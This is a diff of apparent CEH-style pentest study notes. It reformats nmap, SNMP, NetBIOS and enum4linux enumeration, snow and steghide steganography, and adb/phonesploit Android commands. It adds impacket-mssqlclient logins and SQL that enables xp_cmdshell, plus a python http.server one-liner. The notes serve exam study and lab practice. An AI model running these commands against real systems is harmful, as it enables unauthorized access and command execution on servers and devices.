@@ -22,8 +22,11 @@ If even this the above command is not working then use this command-  namp -f 10
 ```
 1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
 2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
-3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
-                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
+
+3- SNMP enum using nmap-  
+   nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
+   snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
+
 4- DNS recon/enum-  dnsrecon -d www.google.com -z
 5- FTP enum using nmap-  nmap -p 21 -A 10.10.10.10 
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
@@ -37,10 +40,11 @@ If even this the above command is not working then use this command-  namp -f 10
 ```
 #  Quick Overview (Stegnography) --> Snow , Openstego
 ```
-1- Hide Data Using Whitespace Stegnography- snow -C -m "<text>" -p "<pwd>" readme.txt readme2.txt  (pwd is password and your secret is stored in readme2.txt along with the content of readme.txt)
-2- To Display Hidden Data- snow -C -p "<pwd>" readme2.txt (then it will show the content of readme2.txt content)
-3- Image Stegnography using Openstego- 
-4- extract hidden file -  steghide extract -sf stealth.jpeg
+snow -C -m "<text>" -p "<pwd>" readme.txt readme2.txt   (1- Hide Data Using Whitespace Stegnography- pwd is password and your secret is stored in 														readme2.txt along with the content of readme.txt)
+snow -C -p "<pwd>" readme2.txt 							(To Display Hidden Data- then it will show the content of readme2.txt content)
+
+Image Stegnography using Openstego
+steghide extract -sf stealth.jpeg 						(Extract hidden file) 
 ```
 #  Sniffing
 ```
@@ -95,6 +99,17 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+
+impacket-mssqlclient <domain>/<username>:<password>@<ipaddr> -windows-auth
+impacket-mssqlclient <user>:<pwd>@<ipaddr>
+
+SELECT IS_SRVROLEMEMBER('sysadmin');			(Check quyền)
+EXEC sp_configure 'xp_cmdshell';				(Check xp_cmdshell)
+
+EXEC sp_configure 'show advanced options',1;	(Bật nếu cần)
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
 ```
 # Android
 ```
@@ -105,7 +120,7 @@ adb shell                                             (Access mobile device on p
 adb push <pc location> <android location>
 adb pull <android location> <pc location>
 pwd --> ls --> cd sdcard --> ls --> cat secret.txt    (If you can't find it there then go to Downloads folder using: cd downloads)
-python phonesploit.py                                 
+python3 phonesploit.py                                 
 crc32 												  (Now type crc32 path to apk to Determine the complete CRC value)
 ```
 # Wireshark
@@ -141,6 +156,7 @@ john --format=NT hashes.txt
 
 #  Some extra work 
 ```
-Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
-Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
+nmap -p 3389 -iL ip.txt | grep open 		(Check RDP enabled after getting ip- ip.txt contains all the alive hosts from target subnet)
+nmap -p 3306 -iL ip.txt | grep open			(Check MySQL service running- ip.txt contains all the alive hosts from target subnet)
+python3 -m http.server 8000
 ```
